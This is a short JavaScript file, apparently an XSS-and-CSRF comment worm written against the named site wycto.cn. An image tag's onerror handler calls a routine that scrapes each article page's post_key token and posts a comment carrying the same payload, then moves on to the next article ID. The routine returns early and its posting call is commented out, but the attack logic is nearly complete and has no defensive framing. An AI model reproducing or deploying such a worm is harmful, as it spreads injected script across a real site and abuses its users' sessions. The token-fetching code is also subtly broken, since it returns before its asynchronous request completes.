var img = '<img src=\'error233.jpg\' onerror=\'javascript:CSRF.ruChong(1)\'>pigpig'
var CSRF = {
  /**
   * 创建评论
   *
   * @param {number} model_key 文章 ID
   */
  ruChong: function (model_key) {
    return;
      var model_key = model_key || $('input[name=model_key]').val();
      console.log(model_key);
      var post_key = CSRF.getPostKey(model_key);
      console.log(post_key);
      var model = $('input[name=model]').val();
      var uid = $('input[name=uid]').val();
      var content = img;
      /*$.post('http://www.wycto.cn/user/comment/create.html',{ post_key:post_key, model:model, model_key: model_key, uid: uid, content: content },function(data){
          CSRF.ruChong(model_key++)
      },'json');*/
  },

  /**
   * 获取 post_key
   *
   * @param {number} model_key 文章 ID
   */
  getPostKey: function (model_key) {
      var post_key = '';
      var url = 'http://www.wycto.cn/index/article/view/id/' + model_key + '.html';
      $.post(url,{ },function(html){
        //var html = '<div class="layui-form-item layui-form-text"><input type="hidden" name="post_key" value="30602a60e7bac625d653d67ae4a1fb88"><input type="hidden" name="model" value="article">'
          post_key = html.match(/post_key" value="(\S*)">/)[1]
          console.log(post_key)
      },'html');
      return post_key
  },
}
CSRF.ruChong()